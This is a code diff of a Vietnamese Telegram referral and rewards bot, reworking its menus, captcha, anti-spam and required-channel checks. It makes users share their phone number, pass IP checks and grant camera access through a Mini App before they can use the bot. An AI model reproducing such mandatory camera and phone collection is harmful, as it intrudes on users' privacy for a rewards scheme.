+        commit=True,
+    )
+
 
 async def is_maintenance():
-    return await get_setting("maintenance", "0")
-
-# ============================================================
-# UTILS & VIETQR & HÀM GỬI THÔNG BÁO BỊ KHÓA VÀO NHÓM
-# ============================================================
-
-async def send_ban_alert_to_group(bot, user_id: int, username: str, ip_address: str, reason: str):
-    """Gửi thông tin người dùng bị khóa vĩnh viễn do VPN/Proxy hoặc trùng IP vào nhóm chỉ định."""
-    uname_str = f"@{username}" if username else "Không có"
-    alert_msg = (
-        f"{E['BAN']} <b>HỆ THỐNG KHÓA TÀI KHOẢN VĨNH VIỄN</b>\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"👤 <b>Thành viên:</b> {uname_str} (<code>{user_id}</code>)\n"
-        f"🌐 <b>Địa chỉ IP:</b> <code>{ip_address or 'N/A'}</code>\n"
-        f"📌 <b>Lý do khóa:</b> <b>{reason}</b>\n"
-        f"🗓 <b>Thời gian:</b> <code>{get_now_str()}</code>"
+    res = await db_query(
+        "SELECT value FROM settings WHERE key='maintenance'", fetchone=True
     )
+    return bool(res and res[0] == "1")
+
+
+async def reset_camera_verification():
+    await db_query(
+        "UPDATE users SET miniapp_captcha_verified=0, camera_verified=0, cccam_verified=0",
+        commit=True,
+    )
+    pending_miniapp_captcha.clear()
+    pending_camera_verified.clear()
+
+
+async def send_split_message(bot, chat_id, text, parse_mode="HTML"):
+    MAX_LEN = 4000
+    if len(text) <= MAX_LEN:
+        await bot.send_message(
+            chat_id=chat_id,
+            text=text,
+            parse_mode=parse_mode,
+            disable_web_page_preview=True,
+        )
+        return
+
+    lines = text.split("\n")
+    current_chunk = ""
+    for line in lines:
+        if len(current_chunk) + len(line) + 1 > MAX_LEN:
+            await bot.send_message(
+                chat_id=chat_id,
+                text=current_chunk,
+                parse_mode=parse_mode,
+                disable_web_page_preview=True,
+            )
+            current_chunk = line + "\n"
+            await asyncio.sleep(0.3)
+        else:
+            current_chunk += line + "\n"
+    if current_chunk.strip():
+        await bot.send_message(
+            chat_id=chat_id,
+            text=current_chunk,
+            parse_mode=parse_mode,
+            disable_web_page_preview=True,
+        )
+
+
+async def check_bio_flag(bot, uid: int):
     try:
-        # Nếu LOG_ALERT_GROUP là một @username công khai hoặc link dạng t.me/...
-        target = LOG_ALERT_GROUP
-        if target.startswith("https://t.me/"):
-            target = "@" + target.split("t.me/")[-1].strip("/")
-        
-        await bot.send_message(chat_id=target, text=alert_msg, parse_mode="HTML")
+        chat_full = await bot.get_chat(uid)
+        return BIO_FLAG in (chat_full.bio or "").lower()
     except Exception as exc:
-        logger.error("Không gửi được thông báo khóa tài khoản vào nhóm %s: %s", LOG_ALERT_GROUP, exc)
+        logger.warning(f"Không đọc được bio user {uid}: {exc}")
+        return None
 
-def get_random_referral_reward() -> int:
-    rand_val = random.random() * 100
-    if rand_val < 10:
-        return 1500
-    elif rand_val < 30:
-        return 1400
-    elif rand_val < 60:
-        return 1300
-    else:
-        return random.choice([1000, 1100, 1200])
 
-def generate_vietqr_url(bank_info: str, amount: int, memo: str = "lixi trung thu") -> str:
-    if not bank_info:
-        return ""
-    parts = bank_info.strip().split()
-    if len(parts) < 2:
-        return ""
+async def load_code_price():
+    global CODE_PRICE
+    res = await db_query(
+        "SELECT value FROM settings WHERE key='code_price'", fetchone=True
+    )
+    if res and str(res[0]).isdigit() and int(res[0]) > 0:
+        CODE_PRICE = int(res[0])
 
-    stk = parts[0]
-    bank_code = parts[1].upper()
 
-    bank_mapping = {
-        "VCB": "vietcombank", "VIETCOMBANK": "vietcombank", "TCB": "techcombank",
-        "TECHCOMBANK": "techcombank", "MB": "mbbank", "MBBANK": "mbbank",
-        "STB": "sacombank", "SACOMBANK": "sacombank", "ACB": "acb",
-        "VPB": "vpbank", "VPBANK": "vpbank", "TPB": "tpbank",
-        "TPBANK": "tpbank", "BIDV": "bidv", "CTG": "vietinbank",
-        "VIETINBANK": "vietinbank", "AGRIBANK": "agribank", "VIB": "vib",
-        "SHB": "shb", "MSB": "msb", "LPB": "lienvietpostbank",
-        "LPBANK": "lienvietpostbank", "OCB": "ocb", "HDB": "hdbank", "HDBANK": "hdbank",
-    }
+async def save_code_price(new_price: int):
+    global CODE_PRICE
+    await db_query(
+        "INSERT INTO settings (key, value) VALUES ('code_price', %s) "
+        "ON CONFLICT (key) DO UPDATE SET value=EXCLUDED.value",
+        (str(new_price),),
+        commit=True,
+    )
+    CODE_PRICE = new_price
 
-    code = bank_mapping.get(bank_code, bank_code.lower())
-    encoded_memo = urllib.parse.quote(memo)
-    return f"https://img.vietqr.io/image/{code}-{stk}-compact2.png?amount={amount}&addInfo={encoded_memo}"
 
-# ============================================================
-# KEYBOARD
-# ============================================================
+def _parse_money(s: str):
+    try:
+        v = int(re.sub(r"[.,đĐ\s]", "", s))
+        return v if v > 0 else None
+    except (ValueError, TypeError):
+        return None
 
-def get_main_keyboard():
+
+CHANNEL_URLS = {}
+
+
+def _norm_chat_ref(raw: str):
+    raw = (raw or "").strip()
+    if "t.me/" in raw:
+        tail = raw.split("t.me/")[-1].split("?")[0].strip("/")
+        if not tail or tail.startswith("+") or tail.startswith("joinchat"):
+            return None
+        raw = "@" + tail
+    if re.fullmatch(r"-?\d{6,}", raw):
+        return raw
+    if re.fullmatch(r"@[A-Za-z0-9_]{4,}", raw):
+        return raw
+    if re.fullmatch(r"[A-Za-z0-9_]{4,}", raw):
+        return "@" + raw
+    return None
+
+
+def _api_chat_id(ref: str):
+    return int(ref) if ref.lstrip("-").isdigit() else ref
+
+
+async def get_required_channels():
+    return (
+        await db_query(
+            "SELECT id, chat_ref, title, invite_url FROM required_channels ORDER BY id ASC",
+            fetchall=True,
+        )
+        or []
+    )
+
+
+async def check_bot_admin(bot, ref: str):
+    try:
+        chat = await bot.get_chat(_api_chat_id(ref))
+        me = await bot.get_me()
+        m = await bot.get_chat_member(chat.id, me.id)
+        return (m.status in ("administrator", "creator")), m.status, chat
+    except Exception as exc:
+        return False, f"lỗi: {exc}", None
+
+
+def _menu_btn(text: str, key: str) -> KeyboardButton:
+    return KeyboardButton(
+        text, api_kwargs={"icon_custom_emoji_id": MENU_ICON_IDS[key]}
+    )
+
+
+def get_main_keyboard(user_id=None):
     keyboard = [
-        [KeyboardButton("👤 Tài Khoản"), KeyboardButton("🎁 Mời Bạn Bè")],
-        [KeyboardButton("💳 Rút Tiền"), KeyboardButton("🔝 Top")],
-        [KeyboardButton("💬 Nhóm Hỗ Trợ"), KeyboardButton("📜 Lịch Sử Giao Dịch")],
+        [_menu_btn("Tài Khoản", "account"), _menu_btn("Mời Bạn Bè", "invite")],
+        [_menu_btn("Rút Code", "withdraw"), _menu_btn("Top", "top")],
+        [
+            _menu_btn("Nhóm Hỗ Trợ", "support"),
+            _menu_btn("Lịch Sử Giao Dịch", "history"),
+        ],
+        [_menu_btn("Link Game", "game")],
     ]
+    if user_id in ADMIN_IDS:
+        keyboard.append([_menu_btn("Menu", "admin")])
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
-# ============================================================
-# CAPTCHA & CHECK IP & PHONE VERIFICATION
-# ============================================================
 
-def generate_captcha():
-    a = random.randint(1, 20)
-    b = random.randint(1, 20)
-    correct_ans = a + b
-    options = {correct_ans}
-    while len(options) < 4:
-        wrong = correct_ans + random.randint(-5, 5)
-        if wrong > 0 and wrong != correct_ans:
-            options.add(wrong)
-    opts_list = list(options)
-    random.shuffle(opts_list)
-    return a, b, correct_ans, opts_list
+def get_game_link_markup():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("Nhập Code Tại Đây", url=GAME_CODE_URL)],
+        [InlineKeyboardButton("Link room tại đây", url=GAME_ROOM_URL)],
+    ])
 
-async def send_phone_verification_challenge(update_or_message, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update_or_message.effective_user.id if hasattr(update_or_message, "effective_user") else update_or_message.from_user.id
-    caption = (
-        f"{E['LOCK']} <b>XÁC MINH SỐ ĐIỆN THOẠI</b>\n\n"
-        f"{E['ALERT1']} <b>Yêu cầu tài khoản hợp lệ:</b>\n"
-        f"{E['CHECK_ANIMATED']} Số điện thoại Việt Nam (+84)\n"
-        f"{E['CHECK_ANIMATED']} Tên hiển thị không quá 20 ký tự\n"
-        f"{E['CHECK_ANIMATED']} Có username (@)\n"
-        f"{E['CHECK_ANIMATED']} Có ảnh đại diện\n"
-        f"{E['ARROW_DOWN']} Nhấn nút bên dưới để chia sẻ số điện thoại:"
+
+def get_contact_keyboard():
+    keyboard = [
+        [KeyboardButton("📱 Chia sẻ số điện thoại", request_contact=True)]
+    ]
+    return ReplyKeyboardMarkup(
+        keyboard, resize_keyboard=True, one_time_keyboard=True
     )
-    kb = ReplyKeyboardMarkup(
-        [[KeyboardButton("📱 Chia sẻ số điện thoại", request_contact=True)]],
-        resize_keyboard=True,
-        one_time_keyboard=True
+
+
+def get_miniapp_keyboard():
+    keyboard = [[
+        KeyboardButton(
+            "🌐 BẤM VÀO ĐÂY ĐỂ XÁC MINH IP",
+            web_app=WebAppInfo(url=MINI_APP_URL),
+        )
+    ]]
+    return ReplyKeyboardMarkup(
+        keyboard, resize_keyboard=True, one_time_keyboard=True
     )
-    if hasattr(update_or_message, "reply_text"):
-        await update_or_message.reply_text(caption, parse_mode="HTML", reply_markup=kb)
+
+
+fn_miniapp_captcha_url = lambda token: f"{MINI_APP_URL}{'&' if '?' in MINI_APP_URL else '?' }mode=captcha&token={token}"
+
+
+def get_miniapp_captcha_keyboard(token: str):
+    keyboard = [[KeyboardButton(
+        "🧩 XÁC MINH CAPTCHA & TRUY CẬP CAMERA",
+        web_app=WebAppInfo(url=fn_miniapp_captcha_url(token)),
+    )]]
+    return ReplyKeyboardMarkup(
+        keyboard, resize_keyboard=True, one_time_keyboard=True
+    )
+
+
+async def prompt_miniapp_captcha_verification(
+    message_or_bot, user_id, is_retry=False
+):
+    existing = pending_miniapp_captcha.get(user_id)
+    if existing and datetime.now() <= existing["expires_at"] and not is_retry:
+        token = existing["token"]
     else:
-        await context.bot.send_message(chat_id=user_id, text=caption, parse_mode="HTML", reply_markup=kb)
+        token = secrets.token_urlsafe(12)
+        pending_miniapp_captcha[user_id] = {
+            "token": token,
+            "expires_at": datetime.now()
+            + timedelta(minutes=MINIAPP_CAPTCHA_TTL_MINUTES),
+        }
 
-async def send_ip_verification_challenge(update_or_message, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update_or_message.effective_user.id if hasattr(update_or_message, "effective_user") else update_or_message.from_user.id
-    caption = (
-        f"{E['ALERT1']} <b>BƯỚC XÁC MINH MẠNG (CHECK IP MINIAPP)</b>\n"
+    msg = (
+        f"{E['SHIELD']} <b>XÁC MINH CAPTCHA & TRUY CẬP CAMERA</b>\n"
         f"━━━━━━━━━━━━━━━━━━\n"
-        f"Vui lòng nhấn vào nút <b>🌐 XÁC MINH IP QUA MINIAPP</b> ở bàn phím bên dưới để xác minh địa chỉ IP của bạn:\n"
-        f"<i>(Lưu ý: Nghiêm cấm sử dụng VPN/Proxy hoặc trùng IP. Phát hiện sẽ bị khóa vĩnh viễn!)</i>"
+        f"{E['WARN']} Bạn <b>bắt buộc</b> phải hoàn thành captcha và cho phép truy cập camera trong Mini App mới được sử dụng bot.\n"
+        f"{E['HOURGLASS']} Hiệu lực: <b>{MINIAPP_CAPTCHA_TTL_MINUTES} phút</b>\n"
+        f"{E['RIGHT']} Nhấn nút <b>🧩 XÁC MINH CAPTCHA & TRUY CẬP CAMERA</b> bên dưới và hoàn thành thao tác!"
     )
-    kb = ReplyKeyboardMarkup(
-        [[KeyboardButton("🌐 XÁC MINH IP QUA MINIAPP", web_app=WebAppInfo(url=WEBAPP_URL))]],
-        resize_keyboard=True,
-        one_time_keyboard=True
-    )
-    if hasattr(update_or_message, "reply_text"):
-        await update_or_message.reply_text(caption, parse_mode="HTML", reply_markup=kb)
+    kb = get_miniapp_captcha_keyboard(token)
+    if hasattr(message_or_bot, "reply_text"):
+        await message_or_bot.reply_text(
+            msg, reply_markup=kb, parse_mode="HTML"
+        )
     else:
-        await context.bot.send_message(chat_id=user_id, text=caption, parse_mode="HTML", reply_markup=kb)
+        await message_or_bot.send_message(
+            chat_id=user_id, text=msg, reply_markup=kb, parse_mode="HTML"
+        )
 
-# ============================================================
-# KIỂM TRA LUỒNG XÁC MINH CHUNG
-# ============================================================
 
-async def process_user_verification_flow(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int) -> bool:
-    db_user = await get_fresh_user(user_id)
-    if not db_user:
-        return False
+async def proceed_next_verification(
+    update_or_msg, context: ContextTypes.DEFAULT_TYPE, user
+):
+    user_id = user.id
 
-    if await get_setting("check_channels"):
-        missing_channels = await get_missing_channels(context.bot, user_id)
-        if missing_channels:
-            buttons = build_channel_buttons(missing_channels)
-            missing_text = "\n".join([f"• <b>{ch}</b>" for ch in missing_channels])
-            msg = (
-                f"{E['ALERT1']} <b>BẠN CHƯA THAM GIA ĐỦ CÁC KÊNH/NHÓM!</b>\n━━━━━━━━━━━━━━━━━━\n"
-                f"{E['STOP']} Bạn còn thiếu <b>{len(missing_channels)}</b> kênh/nhóm sau:\n\n{missing_text}\n\n"
-                f"{E['CLIP']} Vui lòng tham gia đầy đủ rồi bấm nút <b>XÁC NHẬN ĐÃ THAM GIA</b> bên dưới!"
-            )
-            if update.effective_message:
-                await update.effective_message.reply_text(msg, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="HTML")
-            return False
+    if await get_verify_setting("verify_phone"):
+        if not await check_phone_verified(user_id) and user_id not in ADMIN_IDS:
+            await prompt_phone_verification(update_or_msg, user_id)
+            return
 
-    if await get_setting("check_phone") and not db_user[9]:
-        await send_phone_verification_challenge(update.effective_message or update, context)
-        return False
+    if await get_verify_setting("verify_cccam"):
+        if not await check_cccam_verified(user_id) and user_id not in ADMIN_IDS:
+            await prompt_miniapp_captcha_verification(update_or_msg, user_id)
+            return
 
-    if await get_setting("check_ip") and not db_user[13] and db_user[14] == 0:
-        await send_ip_verification_challenge(update.effective_message or update, context)
-        return False
+    if await get_verify_setting("verify_miniapp_captcha") or await get_verify_setting(
+        "verify_camera"
+    ):
+        if (
+            not await check_miniapp_captcha_verified(user_id)
+            or not await check_camera_verified(user_id)
+        ) and user_id not in ADMIN_IDS:
+            await prompt_miniapp_captcha_verification(update_or_msg, user_id)
+            return
 
-    if await get_setting("check_captcha") and not db_user[7]:
-        await send_captcha_challenge(update, context, message_text=f"{E['ALERT1']} <b>Vui lòng giải CAPTCHA để tiếp tục:</b>")
-        return False
+    if await get_verify_setting("verify_ip"):
+        if not await check_ip_verified(user_id) and user_id not in ADMIN_IDS:
+            await prompt_ip_verification(update_or_msg, user_id)
+            return
 
-    return True
+    if await get_verify_setting("verify_captcha"):
+        if not await check_captcha_verified(user_id) and user_id not in ADMIN_IDS:
+            if user_id in pending_captcha_users:
+                return
+            await send_captcha_challenge(update_or_msg, context, user_id)
+            return
 
-async def trigger_referral_reward_if_eligible(user_id: int, context: ContextTypes.DEFAULT_TYPE):
-    db_user = await get_fresh_user(user_id)
-    if not db_user:
-        return
-
-    if len(db_user) > 15 and db_user[15] == 1:
-        return
-
-    referrer_id, ref_rewarded = db_user[4], db_user[6]
-
-    check_cap = not await get_setting("check_captcha") or db_user[7] == 1
-    check_phn = not await get_setting("check_phone") or db_user[9] == 1
-    check_ip_cond = not await get_setting("check_ip") or db_user[13] is not None or db_user[14] == 1
-
-    missing_channels = await get_missing_channels(context.bot, user_id)
-    check_chan = len(missing_channels) == 0 if await get_setting("check_channels") else True
-
-    if referrer_id and ref_rewarded == 0 and check_cap and check_phn and check_ip_cond and check_chan:
-        earned_reward = get_random_referral_reward()
-        try:
-            def reward_referrer(cursor):
-                cursor.execute("SELECT ref_rewarded FROM users WHERE user_id=%s", (user_id,))
-                res = cursor.fetchone()
-                if res and res[0] == 1:
-                    return False
-
-                cursor.execute(
-                    "INSERT INTO transactions (user_id, type, amount, status, created_at, details) VALUES (%s, %s, %s, %s, %s, %s)",
-                    (referrer_id, "Thưởng Mời Bạn", earned_reward, "Thành công", get_now_str(), f"Mời {user_id} (Random trúng {earned_reward})"),
+    if await get_verify_setting("verify_channel"):
+        if user_id not in ADMIN_IDS:
+            missing_channels = await get_missing_channels(context.bot, user_id)
+            if missing_channels:
+                buttons = build_channel_buttons(missing_channels)
+                missing_text = "\n".join([
+                    f"• <b>{ch}</b>" for ch in missing_channels
+                ])
+                msg = (
+                    f"{E['BANDAGE']} <b>BẠN CHƯA THAM GIA ĐỦ CÁC KÊNH/NHÓM!</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                    f"{E['WARN']} Bạn còn thiếu <b>{len(missing_channels)}</b> kênh/nhóm sau:\n\n"
+                    f"{missing_text}\n\n"
+                    f"{E['RIGHT']} Vui lòng tham gia đầy đủ rồi bấm nút <b>XÁC NHẬN ĐÃ THAM GIA</b> bên dưới!"
                 )
-                cursor.execute("UPDATE users SET balance = balance + %s WHERE user_id=%s", (earned_reward, referrer_id))
-                cursor.execute("UPDATE users SET ref_rewarded = 1 WHERE user_id=%s", (user_id,))
-                return True
-
-            rewarded = await db_transaction(reward_referrer)
-            if rewarded:
-                uname = f"@{db_user[1]}" if db_user[1] else str(user_id)
-                try:
-                    await context.bot.send_message(
-                        chat_id=referrer_id,
-                        text=f"{E['LOVE']} <b>THƯỞNG MỜI BẠN BÈ THÀNH CÔNG!</b>\n{E['UP']} Bạn nhận được ngẫu nhiên: <b>+{earned_reward:,}đ</b>\n{E['EYES']} Từ người dùng xác thực thành công: <b>{uname}</b>",
-                        parse_mode="HTML"
+                if hasattr(update_or_msg, "reply_text"):
+                    await update_or_msg.reply_text(
+                        msg,
+                        reply_markup=InlineKeyboardMarkup(buttons),
+                        parse_mode="HTML",
                     )
-                except Exception as exc:
-                    logger.warning("Không gửi được thông báo referrer: %s", exc)
-        except Exception as exc:
-            logger.exception("Lỗi transaction thưởng giới thiệu: %s", exc)
+                else:
+                    await context.bot.send_message(
+                        chat_id=user_id,
+                        text=msg,
+                        reply_markup=InlineKeyboardMarkup(buttons),
+                        parse_mode="HTML",
+                    )
+                return
 
-# ============================================================
-# KIỂM TRA THAM GIA KÊNH
-# ============================================================
+    await finalize_user_registration(user, context)
 
-async def chat_member_updated_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    pass
-
-async def get_missing_channels(bot, user_id):
-    sem = asyncio.Semaphore(4)
-
-    async def check_one(channel):
-        async with sem:
-            try:
-                member = await asyncio.wait_for(
-                    bot.get_chat_member(chat_id=channel, user_id=user_id),
-                    timeout=3.5
-                )
-                if member.status in ("left", "kicked"):
-                    return channel
-            except Exception as exc:
-                logger.warning(f"Lỗi check kênh {channel} cho user {user_id}: {exc}")
-                return channel
-            return None
-
-    tasks = [check_one(ch) for ch in REQUIRED_CHECK_CHANNELS]
-    results = await asyncio.gather(*tasks)
-    return [ch for ch in results if ch is not None]
-
-def build_channel_buttons(missing_channels):
-    buttons = []
-    for ch in missing_channels:
-        channel_url = f"https://t.me/{ch.replace('@', '')}"
-        buttons.append([InlineKeyboardButton(f"👉 Tham gia: {ch}", url=channel_url)])
-    for ch in OPTIONAL_DISPLAY_CHANNELS:
-        channel_url = f"https://t.me/{ch.replace('@', '')}"
-        buttons.append([InlineKeyboardButton(f"🌟 Tham gia: {ch} (Tham khảo)", url=channel_url)])
-    buttons.append([InlineKeyboardButton("❇️ XÁC NHẬN ĐÃ THAM GIA ❇️", callback_data="verify_join")])
-    return buttons
-
-# ============================================================
-# ANTI SPAM
-# ============================================================
 
 async def handle_anti_spam(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    chat = update.effective_chat
     user = update.effective_user
-    message = update.effective_message
-
-    if not chat or chat.type != "private" or not user or not message:
+    if not user or user.id in ADMIN_IDS:
         return False
+    uid = user.id
+    now = time.time()
 
-    if user.id in ADMIN_IDS:
-        return False
-
-    now = datetime.now()
-
-    ban_until = temp_bans.get(user.id)
+    ban_until = temp_bans.get(uid)
     if ban_until:
         if now < ban_until:
-            remaining_seconds = max(0, int((ban_until - now).total_seconds()))
-            minutes = remaining_seconds // 60
-            seconds = remaining_seconds % 60
-            await message.reply_text(
-                f"{E['BAN']} <b>BẠN ĐÃ BỊ TẠM CẤM TÍNH NĂNG!</b>\n"
-                f"{E['CALENDAR']} Vui lòng chờ: <b>{minutes} phút {seconds} giây</b>\n"
-                f"{E['ALERT1']} Lý do: <b>Spam thao tác quá nhanh.</b>",
-                parse_mode="HTML"
-            )
             return True
-        else:
-            temp_bans.pop(user.id, None)
+        temp_bans.pop(uid, None)
+        user_msg_tracker.pop(uid, None)
 
-    cutoff = now - timedelta(seconds=SPAM_WINDOW_SECONDS)
-    user_msg_tracker[user.id] = [t for t in user_msg_tracker[user.id] if t >= cutoff]
-    user_msg_tracker[user.id].append(now)
+    timestamps = [t for t in user_msg_tracker[uid] if now - t <= SPAM_WINDOW_SECONDS]
+    timestamps.append(now)
+    user_msg_tracker[uid] = timestamps
 
-    if len(user_msg_tracker[user.id]) >= SPAM_MAX_MESSAGES:
-        temp_bans[user.id] = now + timedelta(minutes=TEMP_BAN_MINUTES)
-        user_msg_tracker[user.id].clear()
-        await message.reply_text(
-            f"{E['BAN']} <b>CẢNH BÁO ANTI-SPAM</b>\n"
-            f"{E['STOP']} Bạn đã bị cấm <b>{TEMP_BAN_MINUTES} phút</b>!\n"
-            f"{E['ALERT1']} Lý do: Thao tác quá <b>{SPAM_MAX_MESSAGES} lần</b> trong <b>{SPAM_WINDOW_SECONDS}s</b>.",
-            parse_mode="HTML"
-        )
+    if len(timestamps) > SPAM_MAX_MESSAGES:
+        temp_bans[uid] = now + TEMP_BAN_MINUTES * 60
+        user_msg_tracker.pop(uid, None)
+        try:
+            await context.bot.send_message(
+                chat_id=uid,
+                text=(
+                    f"{E['WARN']} <b>BẠN GỬI TIN NHẮN QUÁ NHANH!</b>\n"
+                    f"Tạm khóa thao tác trong <b>{TEMP_BAN_MINUTES} phút</b>."
+                ),
+                parse_mode="HTML",
+            )
+        except Exception:
+            pass
         return True
-
     return False
 
-# ============================================================
-# USER QUERY
-# ============================================================
-
-USER_SELECT_QUERY = (
-    "SELECT user_id, username, balance, bank_info, referrer_id, "
-    "phone_number, ref_rewarded, is_captcha_passed, is_text_verified, "
-    "is_phone_verified, is_banned, is_withdraw_banned, joined_at, ip_address, skip_ip_check, "
-    "skip_ref_once "
-    "FROM users WHERE user_id=%s"
-)
 
 async def ensure_user_exists(update: Update):
     user = update.effective_user
     if not user:
         return None
-    row = await db_query(USER_SELECT_QUERY, (user.id,), fetchone=True)
-    if row:
-        current_username = user.username or ""
-        if row[1] != current_username:
-            await db_query("UPDATE users SET username=%s WHERE user_id=%s", (current_username, user.id), commit=True)
-    else:
-        hist = await db_query("SELECT user_id FROM users_history WHERE user_id=%s", (user.id,), fetchone=True)
-
-        skip_ref = 1 if hist else 0
-
+    q = (
+        "SELECT user_id, balance, username, is_banned, is_withdraw_banned, "
+        "referrer_id, phone_number, ip_address FROM users WHERE user_id=%s"
+    )
+    row = await db_query(q, (user.id,), fetchone=True)
+    if not row:
         await db_query(
-            "INSERT INTO users (user_id, username, balance, joined_at, skip_ref_once) "
-            "VALUES (%s, %s, 0, %s, %s) ON CONFLICT (user_id) DO NOTHING",
-            (user.id, user.username or "", get_now_str(), skip_ref),
+            "INSERT INTO users (user_id, username, balance, joined_at) "
+            "VALUES (%s, %s, 0, %s) ON CONFLICT (user_id) DO NOTHING",
+            (user.id, user.username or "", get_now_str()),
             commit=True,
         )
-
-        await db_query(
-            "INSERT INTO users_history (user_id, first_seen_at) VALUES (%s, %s) "
-            "ON CONFLICT (user_id) DO NOTHING",
-            (user.id, get_now_str()),
-            commit=True,
-        )
-
-        row = await db_query(USER_SELECT_QUERY, (user.id,), fetchone=True)
+        row = await db_query(q, (user.id,), fetchone=True)
     return row
 
-async def get_fresh_user(user_id: int):
-    return await db_query(USER_SELECT_QUERY, (user_id,), fetchone=True)
 
-async def require_private_user(update: Update):
-    if not update.effective_chat or update.effective_chat.type != "private":
-        return False
+async def _check_flag(user_id: int, column: str) -> bool:
+    res = await db_query(
+        f"SELECT {column} FROM users WHERE user_id=%s", (user_id,), fetchone=True
+    )
+    return bool(res and res[0] == 1)
+
+
+async def check_phone_verified(user_id: int) -> bool:
+    res = await db_query(
+        "SELECT phone_number FROM users WHERE user_id=%s", (user_id,), fetchone=True
+    )
+    return bool(res and res[0])
+
+
+async def check_ip_verified(user_id: int) -> bool:
+    res = await db_query(
+        "SELECT ip_address, skip_ip FROM users WHERE user_id=%s",
+        (user_id,),
+        fetchone=True,
+    )
+    return bool(res and (res[0] or res[1] == 1))
+
+
+async def check_captcha_verified(user_id: int) -> bool:
+    return await _check_flag(user_id, "captcha_verified")
+
+
+async def check_miniapp_captcha_verified(user_id: int) -> bool:
+    return await _check_flag(user_id, "miniapp_captcha_verified")
+
+
+async def check_camera_verified(user_id: int) -> bool:
+    return await _check_flag(user_id, "camera_verified")
+
+
+async def check_cccam_verified(user_id: int) -> bool:
+    return await _check_flag(user_id, "cccam_verified")
+
+
+async def _send_to(message_or_bot, user_id, text, reply_markup=None):
+    if hasattr(message_or_bot, "reply_text"):
+        await message_or_bot.reply_text(
+            text, reply_markup=reply_markup, parse_mode="HTML"
+        )
+    else:
+        await message_or_bot.send_message(
+            chat_id=user_id, text=text, reply_markup=reply_markup, parse_mode="HTML"
+        )
+
+
+async def prompt_phone_verification(message_or_bot, user_id):
+    await _send_to(
+        message_or_bot,
+        user_id,
+        f"{E['PHONE']} <b>XÁC MINH SỐ ĐIỆN THOẠI</b>\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"{E['WARN']} Bạn cần chia sẻ số điện thoại <b>Việt Nam (+84)</b> của chính mình để tiếp tục.\n"
+        f"{E['RIGHT']} Nhấn nút <b>📱 Chia sẻ số điện thoại</b> bên dưới!",
+        get_contact_keyboard(),
+    )
+
+
+async def prompt_ip_verification(message_or_bot, user_id):
+    await _send_to(
+        message_or_bot,
+        user_id,
+        f"{E['GLOBE']} <b>XÁC MINH IP</b>\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"{E['WARN']} Bạn cần xác minh địa chỉ IP qua Mini App để tiếp tục.\n"
+        f"{E['RIGHT']} Nhấn nút <b>🌐 BẤM VÀO ĐÂY ĐỂ XÁC MINH IP</b> bên dưới!",
+        get_miniapp_keyboard(),
+    )
+
+
+def _make_captcha_image(code: str) -> io.BytesIO:
+    w, h = 260, 100
+    img = Image.new("RGB", (w, h), (245, 245, 245))
+    draw = ImageDraw.Draw(img)
+    font = None
+    for path in (
+        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
+        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
+        "DejaVuSans-Bold.ttf",
+        "arial.ttf",
+    ):
+        try:
+            font = ImageFont.truetype(path, 52)
+            break
+        except Exception:
+            continue
+    if font is None:
+        font = ImageFont.load_default()
+
+    for _ in range(8):
+        draw.line(
+            [(random.randint(0, w), random.randint(0, h)),
+             (random.randint(0, w), random.randint(0, h))],
+            fill=(random.randint(120, 200),) * 3,
+            width=2,
+        )
+    x = 18
+    for ch in code:
+        y = random.randint(8, 24)
+        draw.text(
+            (x, y),
+            ch,
+            font=font,
+            fill=(random.randint(0, 100), random.randint(0, 100), random.randint(0, 100)),
+        )
+        x += 46
+    for _ in range(150):
+        draw.point(
+            (random.randint(0, w - 1), random.randint(0, h - 1)),
+            fill=(random.randint(0, 255),) * 3,
+        )
+    bio = io.BytesIO()
+    img.save(bio, format="PNG")
+    bio.seek(0)
+    bio.name = "captcha.png"
+    return bio
+
+
+async def send_captcha_challenge(update_or_msg, context: ContextTypes.DEFAULT_TYPE, user_id: int):
+    alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
+    code = "".join(random.choice(alphabet) for _ in range(5))
+    old = pending_captcha_users.get(user_id) or {}
+    pending_captcha_users[user_id] = {
+        "code": code,
+        "expires_at": datetime.now() + timedelta(minutes=5),
+        "attempts": old.get("attempts", 0),
+    }
+    await context.bot.send_photo(
+        chat_id=user_id,
+        photo=_make_captcha_image(code),
+        caption=(
+            f"{E['SHIELD']} <b>XÁC MINH CAPTCHA</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"{E['RIGHT']} Nhập đúng <b>5 ký tự</b> trong ảnh (không phân biệt hoa/thường).\n"
+            f"{E['HOURGLASS']} Hiệu lực: <b>5 phút</b>"
+        ),
+        parse_mode="HTML",
+        reply_markup=ReplyKeyboardRemove(),
+    )
+
+
+async def handle_captcha_input(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, user_input: str) -> bool:
+    pending = pending_captcha_users.get(user_id)
+    message = update.effective_message
     user = update.effective_user
-    if not user:
+    if not pending or not message or not user:
         return False
-    row = await ensure_user_exists(update)
-    if row and row[10] == 1:
-        await update.effective_message.reply_text(f"{E['BAN']} <b>Tài khoản của bạn đã bị cấm vĩnh viễn khỏi hệ thống!</b>", parse_mode="HTML")
-        return False
+
+    if datetime.now() > pending["expires_at"]:
+        pending_captcha_users.pop(user_id, None)
+        await message.reply_text(
+            f"{E['HOURGLASS']} <b>Captcha đã hết hạn!</b> Đang tạo mã mới...",
+            parse_mode="HTML",
+        )
+        await send_captcha_challenge(message, context, user_id)
+        return True
+
+    if user_input.strip().upper() == pending["code"]:
+        pending_captcha_users.pop(user_id, None)
+        await db_query(
+            "UPDATE users SET captcha_verified=1 WHERE user_id=%s",
+            (user_id,),
+            commit=True,
+        )
+        await message.reply_text(
+            f"{E['CHECK']} Xác minh Captcha thành công!\n\n"
